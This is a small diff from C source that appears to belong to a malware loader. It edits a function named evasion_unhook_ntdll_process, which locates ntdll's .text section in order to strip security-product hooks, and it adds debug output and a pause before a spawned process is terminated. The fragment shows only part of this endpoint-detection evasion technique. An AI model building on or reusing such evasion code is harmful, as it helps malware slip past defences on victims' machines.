@@ -46,6 +46,7 @@ BOOL evasion_unhook_ntdll_process(void) {
 
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         if (strcmp((char*)section[i].Name, ".text") == 0) {
+            DBGA(".text matchs\n");
             DWORD textSize = section[i].Misc.VirtualSize;
             PBYTE textAddr = ntdll + section[i].VirtualAddress;
 
@@ -65,7 +66,8 @@ BOOL evasion_unhook_ntdll_process(void) {
         }
     }
 
-    Sleep(5000);
+    PAUSE("Notepad");
+    
     g_ldr->apis->TerminateProcess(pi.hProcess, 0);
     g_ldr->apis->CloseHandle(pi.hProcess);
     g_ldr->apis->CloseHandle(pi.hThread);
